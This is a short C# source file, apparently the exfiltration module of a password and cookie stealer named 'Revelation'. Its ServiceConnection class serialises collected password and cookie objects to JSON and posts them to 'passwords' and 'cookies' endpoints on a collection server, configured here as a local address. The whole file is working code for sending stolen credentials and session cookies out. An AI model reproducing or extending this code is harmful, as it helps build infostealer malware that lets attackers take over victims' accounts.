using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace Revelation
{
    public static class ServiceConnection
    {
        public static string server_url = "http://127.0.0.1:8000/";
        public static async void post_passwords(List<common.Password> passwords)
        {
            using (var client = new HttpClient())
            {
                // This would be the like http://www.uber.com
                client.BaseAddress = new Uri(server_url);

                // serialize your json using newtonsoft json serializer then add it to the StringContent
                string json = JsonConvert.SerializeObject(passwords);
                var content = new StringContent(json, Encoding.UTF8, "application/json");

                // method address would be like api/callUber:SomePort for example
                var result = await client.PostAsync("passwords", content);
                string resultContent = await result.Content.ReadAsStringAsync();
            }
        }
        public static void post_cookies(List<common.Cookie> cookies)
        {
            var httpWebRequest = (HttpWebRequest)WebRequest.Create(server_url + "cookies");
            httpWebRequest.ContentType = "application/json";
            httpWebRequest.Method = "POST";

            using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
            {
                string json = JsonConvert.SerializeObject(cookies);
                streamWriter.Write(json);
            }
        }
    }
}
